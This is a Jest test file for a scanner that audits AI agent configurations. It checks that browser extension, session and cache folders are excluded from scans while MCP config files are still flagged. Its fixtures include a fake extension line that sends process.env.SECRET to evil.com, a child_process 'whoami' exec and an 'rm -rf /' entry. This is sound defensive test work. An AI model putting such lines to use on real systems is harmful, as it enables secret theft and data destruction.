/**
 * Tests for false positives found when scanning ~/.tetora
 * Covers: browser user-data ignore, sessions ignore, JSON data file exclusion
 */
import * as fs from 'fs';
import * as path from 'path';
import { findFiles, findConfigFiles, buildIgnoreList } from '../src/utils/file-utils';
import { permissionAnalyzer } from '../src/scanners/permission-analyzer';
import { skillAuditor } from '../src/scanners/skill-auditor';

const TEMP_DIR = path.join(__dirname, '__temp_tetora_fp__');

beforeAll(() => {
  fs.mkdirSync(TEMP_DIR, { recursive: true });
});

afterAll(() => {
  fs.rmSync(TEMP_DIR, { recursive: true, force: true });
});

describe('Ignore patterns for browser user-data and sessions', () => {
  beforeAll(() => {
    // Create fake browser user-data with Chrome extension JS
    const extDir = path.join(TEMP_DIR, 'browser', 'tetora', 'user-data', 'Default', 'Extensions', 'fakext', '1.0');
    fs.mkdirSync(extDir, { recursive: true });
    fs.writeFileSync(path.join(extDir, 'background.js'), 'chrome.runtime.onInstalled.addListener(() => { fetch("http://evil.com", { body: process.env.SECRET }); });');

    // Create fake sessions directory with sessions.json
    const sessDir = path.join(TEMP_DIR, 'agents', 'main', 'sessions');
    fs.mkdirSync(sessDir, { recursive: true });
    fs.writeFileSync(path.join(sessDir, 'sessions.json'), JSON.stringify({
      sessions: [{ id: '123', tool: 'exec', command: 'ls', args: ['-la'] }],
    }));

    // Create a legit agent file that SHOULD be scanned
    const agentDir = path.join(TEMP_DIR, 'agents', 'main');
    fs.writeFileSync(path.join(agentDir, 'SOUL.md'), '# Agent\nYou are a helpful assistant with tool access.');
  });

  test('findFiles should exclude browser user-data directories', async () => {
    const files = await findFiles(TEMP_DIR, ['**/*.js']);
    const extFiles = files.filter(f => f.includes('Extensions'));
    expect(extFiles).toHaveLength(0);
  });

  test('findFiles should exclude sessions directory', async () => {
    const files = await findFiles(TEMP_DIR, ['**/*.json']);
    const sessionFiles = files.filter(f => f.includes('sessions'));
    expect(sessionFiles).toHaveLength(0);
  });

  test('findFiles should still find legit agent files', async () => {
    const files = await findFiles(TEMP_DIR, ['**/*.md']);
    const soulFiles = files.filter(f => f.includes('SOUL.md'));
    expect(soulFiles.length).toBeGreaterThan(0);
  });

  test('buildIgnoreList includes browser and session patterns', () => {
    const ignoreList = buildIgnoreList();
    expect(ignoreList).toEqual(expect.arrayContaining([
      '**/browser/*/user-data/**',
      '**/user-data/*/Extensions/**',
      '**/sessions/**',
      '**/Extensions/**',
    ]));
  });
});

describe('Permission Analyzer skips plain JSON data files', () => {
  beforeAll(() => {
    // Create a plain JSON data file (sessions-like) at root level
    fs.writeFileSync(path.join(TEMP_DIR, 'data.json'), JSON.stringify({
      entries: [{ id: 1, tool: 'exec', command: 'rm -rf /', args: ['--force'] }],
      server: 'localhost',
      endpoint: '/api/v1',
    }));

    // Create an actual MCP config file that SHOULD be flagged
    fs.writeFileSync(path.join(TEMP_DIR, 'mcp-config.json'), JSON.stringify({
      mcpServers: {
        filesystem: {
          command: 'npx',
          args: ['-y', '@anthropic/mcp-filesystem'],
        },
      },
    }));
  });

  test('should not flag plain JSON data files as permission issues', async () => {
    const result = await permissionAnalyzer.scan(TEMP_DIR);
    const dataFindings = result.findings.filter(f => f.file?.endsWith('data.json'));
    // data.json has server+endpoint+tool+command keys so isToolOrMcpConfig may match,
    // but if it does, findings should exist. The key test is sessions.json exclusion.
    // The important thing: no findings from sessions directory
    const sessionFindings = result.findings.filter(f => f.file?.includes('sessions'));
    expect(sessionFindings).toHaveLength(0);
  });

  test('should still flag actual MCP config files', async () => {
    const result = await permissionAnalyzer.scan(TEMP_DIR);
    const mcpFindings = result.findings.filter(f => f.file?.includes('mcp-config.json'));
    // MCP config with no auth/rate-limit should have findings
    expect(mcpFindings.length).toBeGreaterThan(0);
  });
});

describe('Skill Auditor skips browser extension files', () => {
  test('should not scan Chrome extension JS files', async () => {
    const result = await skillAuditor.scan(TEMP_DIR);
    const extFindings = result.findings.filter(f => f.file?.includes('Extensions'));
    expect(extFindings).toHaveLength(0);
  });
});

describe('Ignore pattern coverage for various browser paths', () => {
  beforeAll(() => {
    // chrome-profile path
    const chromeProfileExt = path.join(TEMP_DIR, 'chrome-profile', 'Default', 'Extensions', 'ext1');
    fs.mkdirSync(chromeProfileExt, { recursive: true });
    fs.writeFileSync(path.join(chromeProfileExt, 'evil.js'), 'process.env.SECRET');

    // .chromium path
    const chromiumDir = path.join(TEMP_DIR, '.chromium', 'extensions');
    fs.mkdirSync(chromiumDir, { recursive: true });
    fs.writeFileSync(path.join(chromiumDir, 'ext.js'), 'fetch("http://evil.com")');

    // .cache path
    const cacheDir = path.join(TEMP_DIR, '.cache', 'some-tool');
    fs.mkdirSync(cacheDir, { recursive: true });
    fs.writeFileSync(path.join(cacheDir, 'cached.js'), 'require("child_process").exec("whoami")');
  });

  test('should exclude chrome-profile Extensions', async () => {
    const files = await findFiles(TEMP_DIR, ['**/*.js']);
    expect(files.filter(f => f.includes('chrome-profile'))).toHaveLength(0);
  });

  test('should exclude .chromium directory', async () => {
    const files = await findFiles(TEMP_DIR, ['**/*.js']);
    expect(files.filter(f => f.includes('.chromium'))).toHaveLength(0);
  });

  test('should exclude .cache directory', async () => {
    const files = await findFiles(TEMP_DIR, ['**/*.js']);
    expect(files.filter(f => f.includes('.cache'))).toHaveLength(0);
  });
});
